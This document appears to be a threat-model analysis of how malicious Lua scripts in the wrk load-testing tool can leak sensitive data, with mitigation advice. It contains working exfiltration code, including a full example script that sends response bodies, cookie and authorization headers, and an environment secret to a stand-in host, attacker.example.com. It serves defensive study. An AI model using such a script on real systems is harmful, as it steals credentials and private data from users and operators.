# Deep Analysis: Sensitive Data Exposure via Lua Script in `wrk`

## 1. Objective, Scope, and Methodology

### 1.1 Objective

The primary objective of this deep analysis is to:

*   Thoroughly understand the mechanisms by which a malicious Lua script within `wrk` can expose sensitive data.
*   Identify specific vulnerabilities and attack vectors related to this threat.
*   Provide actionable recommendations and best practices to mitigate the risk, going beyond the initial threat model's suggestions.
*   Establish clear guidelines for secure Lua scripting within the `wrk` context.

### 1.2 Scope

This analysis focuses specifically on the threat of sensitive data exposure arising from *maliciously crafted or modified* Lua scripts used with `wrk`.  It considers:

*   The `wrk` Lua scripting API (specifically `request`, `response`, and related functions).
*   Potential attack vectors exploiting the scripting functionality.
*   Data handling practices within the Lua scripts.
*   Interaction with the target application being tested by `wrk`.
*   The environment in which `wrk` and the Lua scripts are executed.

This analysis *does not* cover:

*   General `wrk` vulnerabilities unrelated to Lua scripting.
*   Vulnerabilities in the target application itself (though the Lua script could be used to *discover* them).
*   Network-level attacks (e.g., man-in-the-middle) unless directly facilitated by the malicious Lua script.

### 1.3 Methodology

The analysis will employ the following methodologies:

*   **Code Review (Hypothetical & Example-Driven):**  We will analyze hypothetical and example malicious Lua scripts to demonstrate how data exfiltration can occur.
*   **Threat Modeling Extension:**  We will build upon the existing threat model entry, expanding on the attack vectors and mitigation strategies.
*   **Best Practices Research:**  We will research and incorporate secure coding best practices for Lua, specifically in the context of `wrk`.
*   **Vulnerability Analysis:** We will identify potential vulnerabilities in the way `wrk` handles Lua scripts and their interaction with the HTTP responses.
*   **Documentation Review:** We will review the `wrk` documentation to understand the intended use and limitations of the Lua scripting API.

## 2. Deep Analysis of the Threat

### 2.1 Attack Vectors and Vulnerabilities

A maliciously crafted Lua script can expose sensitive data in several ways:

*   **Direct Response Data Exfiltration:** The most direct attack vector involves accessing the `response.body` and extracting sensitive information.  The attacker can then:
    *   **Print to Console:** `print(response.body)` - Simplest, but easily detectable if console output is monitored.
    *   **Write to File:**  Use Lua's `io` library to write the response body (or extracted parts) to a file on the system running `wrk`.  This is more stealthy.
        ```lua
        -- MALICIOUS EXAMPLE: Writing response body to a file
        function response(status, headers, body)
          local file = io.open("/tmp/exfiltrated_data.txt", "a")
          file:write(body .. "\n")
          file:close()
        end
        ```
    *   **Network Transmission:** Use Lua's socket library (or a custom library) to send the data to an attacker-controlled server. This is the most sophisticated and dangerous approach.
        ```lua
        -- MALICIOUS EXAMPLE: Sending data to a remote server (requires socket library)
        local socket = require("socket")
        function response(status, headers, body)
          local host, port = "attacker.example.com", 12345
          local client = socket.tcp()
          client:connect(host, port)
          client:send(body)
          client:close()
        end
        ```
    *   **Modify Headers:** While less direct, an attacker could potentially inject sensitive data into response headers if the script modifies them. This is less likely, but still a possibility.

*   **Exploiting `request` Function:**  While the primary threat is in the `response` function, a malicious script could also use the `request` function to *probe* for sensitive data by crafting specific requests based on information gleaned from previous responses.  This is a more advanced attack, using `wrk` as an active exploitation tool rather than just a passive data exfiltrator.

*   **Environment Variable Access:**  If sensitive data is stored in environment variables accessible to the `wrk` process, a malicious Lua script could access these using `os.getenv()`.

*   **Abuse of Custom Functions:** If the Lua script defines custom functions that handle sensitive data, these functions become potential targets for malicious modification.

*   **Lua Code Injection (Less Direct, but Possible):** If the Lua script itself is loaded from an untrusted source, or if its contents are dynamically generated based on user input *without proper sanitization*, an attacker could inject malicious Lua code. This is a general Lua security issue, but relevant in the `wrk` context.

### 2.2  Detailed Mitigation Strategies

The initial threat model provided good starting points.  Here's a more detailed breakdown and expansion:

1.  **Mandatory Code Review (Enhanced):**
    *   **Checklist:**  Develop a specific code review checklist for `wrk` Lua scripts.  This checklist should include:
        *   **Data Handling:**  Explicitly identify all points where the script accesses `response.body`, `response.headers`, and any other data sources.  Verify that sensitive data is not being logged, written to files, or transmitted without proper authorization and encryption.
        *   **Logging:**  Scrutinize all `print` statements and any custom logging functions.  Ensure that sensitive data is never logged directly.
        *   **File I/O:**  Review all uses of the `io` library.  Disallow writing to arbitrary file paths.  If file output is necessary, use a designated, secure directory with restricted permissions.
        *   **Network Communication:**  Carefully examine any use of socket libraries or other network communication mechanisms.  Validate the destination and purpose of any outgoing data.  Disallow connections to untrusted hosts.
        *   **Environment Variables:**  Check for uses of `os.getenv()`.  Ensure that sensitive environment variables are not being accessed unnecessarily.
        *   **Custom Functions:**  Thoroughly review any custom functions, paying close attention to how they handle data.
        *   **Input Validation:** If the script takes any input (e.g., from environment variables or command-line arguments), ensure that this input is properly sanitized to prevent code injection.
    *   **Automated Analysis (Static Analysis):** Explore the use of static analysis tools for Lua (e.g., `luacheck`) to automatically detect potential security issues, such as insecure file I/O or network operations.  Integrate this into the CI/CD pipeline.
    *   **Reviewers:**  Ensure that code reviewers have sufficient expertise in both Lua and security best practices.  Consider having separate reviewers for functionality and security.
    *   **Regular Audits:** Conduct regular audits of existing Lua scripts, even after they have been initially reviewed, to ensure that they remain secure and compliant with evolving security policies.

2.  **Input Sanitization (Clarified):**
    *   This primarily applies if the Lua script *itself* takes input (e.g., from environment variables or command-line arguments used to configure the script).  Sanitize these inputs to prevent Lua code injection.  This is *not* about sanitizing the HTTP response body.
    *   Use a whitelist approach whenever possible, allowing only known-good characters and patterns.
    *   Escape or encode any special characters that could be interpreted as Lua code.

3.  **Secure Coding Practices (Expanded):**
    *   **Principle of Least Privilege:**  The `wrk` process and the Lua script should run with the minimum necessary privileges.  Avoid running `wrk` as root.
    *   **Avoid Hardcoded Secrets:**  Never hardcode API keys, passwords, or other sensitive data directly in the Lua script.
    *   **Data Minimization:**  Only retrieve and process the data that is absolutely necessary for the script's intended purpose.  Avoid retrieving entire response bodies if only specific fields are needed.
    *   **Error Handling:** Implement proper error handling to prevent unexpected behavior and potential information leaks.  Avoid exposing internal error messages to the user or logging them insecurely.
    *   **Dependency Management:** If the script uses external Lua libraries, ensure that these libraries are from trusted sources and are kept up-to-date.

4.  **Secrets Management (Reinforced):**
    *   Use a dedicated secrets management system (e.g., HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) to store and manage sensitive data.
    *   Inject secrets into the Lua script's environment at runtime, rather than hardcoding them.  This can be done using environment variables or by providing a secure mechanism for the script to retrieve secrets from the secrets management system.
    *   Ensure that the secrets management system itself is properly secured and configured.

5.  **Secure Logging (Detailed):**
    *   **Avoid Console Logging:**  Never log sensitive data to the console.
    *   **Centralized Logging:**  Use a centralized logging system (e.g., ELK stack, Splunk) to collect and manage logs from `wrk` and other applications.
    *   **Redaction/Masking:**  Implement mechanisms to redact or mask sensitive data in logs.  This can be done using regular expressions or custom redaction functions.
    *   **Encryption:**  Encrypt logs at rest and in transit.
    *   **Access Control:**  Restrict access to logs to authorized personnel only.
    *   **Audit Logging:**  Enable audit logging to track access to and modifications of logs.

6.  **Data Minimization (Practical Example):**
    Instead of:
    ```lua
    function response(status, headers, body)
      print(body) -- DANGEROUS: Prints the entire response body
    end
    ```
    Do:
    ```lua
    function response(status, headers, body)
      -- Assuming you only need the 'Content-Type' header
      local contentType = headers["Content-Type"]
      if contentType then
          print("Content-Type: " .. contentType) -- Only prints the Content-Type
      end
    end
    ```

7. **Sandboxing (Additional Mitigation):**
    *   Consider running the Lua scripts within a sandboxed environment to limit their access to the host system's resources. This can be achieved using technologies like:
        *   **Containers (Docker):** Run `wrk` and the Lua scripts within a Docker container with limited privileges and restricted network access.
        *   **Lua Sandboxes:** Explore Lua-specific sandboxing libraries or techniques to restrict the capabilities of the Lua interpreter. This is more complex but can provide finer-grained control.

8. **Monitoring and Alerting (Additional Mitigation):**
    * Implement monitoring and alerting to detect suspicious activity related to `wrk` and its Lua scripts.
    * Monitor file system access, network connections, and process execution for unusual patterns.
    * Set up alerts for any attempts to access sensitive files or connect to unauthorized hosts.

### 2.3  Example Malicious Script (Comprehensive)

```lua
-- MALICIOUS SCRIPT: Demonstrates multiple exfiltration techniques

-- Requires 'socket' and potentially 'JSON' libraries (for demonstration)
local socket = require("socket")
-- local json = require("json") -- If parsing JSON responses

-- Configuration (attacker would likely modify these)
local attacker_host = "attacker.example.com"
local attacker_port = 12345
local exfiltration_file = "/tmp/exfiltrated_data.txt"

-- Function to send data to the attacker's server
local function send_to_attacker(data)
  local client = socket.tcp()
  local ok, err = client:connect(attacker_host, attacker_port)
  if ok then
    client:send(data .. "\n")
    client:close()
  else
    -- In a real attack, the script would likely try to hide the error
    print("Error connecting to attacker: " .. err)
  end
end

-- Function to write data to a file
local function write_to_file(data)
  local file = io.open(exfiltration_file, "a")
  if file then
    file:write(data .. "\n")
    file:close()
  else
    -- In a real attack, the script would likely try to hide the error
    print("Error writing to file")
  end
end

-- The main response handler
function response(status, headers, body)
  -- 1. Exfiltrate the entire response body
  send_to_attacker("=== FULL RESPONSE BODY ===")
  send_to_attacker(body)
  write_to_file("=== FULL RESPONSE BODY ===")
  write_to_file(body)

  -- 2. Exfiltrate specific headers (e.g., cookies, authorization tokens)
  for k, v in pairs(headers) do
    if string.find(k:lower(), "cookie") or string.find(k:lower(), "authorization") then
      send_to_attacker("=== SENSITIVE HEADER: " .. k .. " ===")
      send_to_attacker(v)
      write_to_file("=== SENSITIVE HEADER: " .. k .. " ===")
      write_to_file(v)
    end
  end

  -- 3. Attempt to parse JSON and exfiltrate specific fields (if applicable)
  --[[  -- This section requires a JSON library
  local parsed_body = json.decode(body)
  if parsed_body then
    if parsed_body.user and parsed_body.user.id then
      send_to_attacker("=== USER ID ===")
      send_to_attacker(parsed_body.user.id)
      write_to_file("=== USER ID ===")
      write_to_file(parsed_body.user.id)
    end
  end
  ]]

  -- 4. Access environment variables (if any are sensitive)
  local secret_env_var = os.getenv("SOME_SECRET_VARIABLE")
  if secret_env_var then
    send_to_attacker("=== SECRET ENVIRONMENT VARIABLE ===")
    send_to_attacker(secret_env_var)
    write_to_file("=== SECRET ENVIRONMENT VARIABLE ===")
    write_to_file(secret_env_var)
  end
end

-- Example request function (could be used for probing)
-- function request()
--   return "GET /sensitive_endpoint HTTP/1.1\r\nHost: example.com\r\n\r\n"
-- end
```

This example demonstrates:

*   Sending data to a remote server.
*   Writing data to a file.
*   Extracting specific headers.
*   (Commented out) Parsing JSON and extracting specific fields.
*   Accessing environment variables.
*   A basic (commented out) example of how `request` could be used maliciously.

This comprehensive example highlights the various ways an attacker can leverage Lua scripting within `wrk` to exfiltrate sensitive data.  It underscores the critical need for the robust mitigation strategies outlined above.
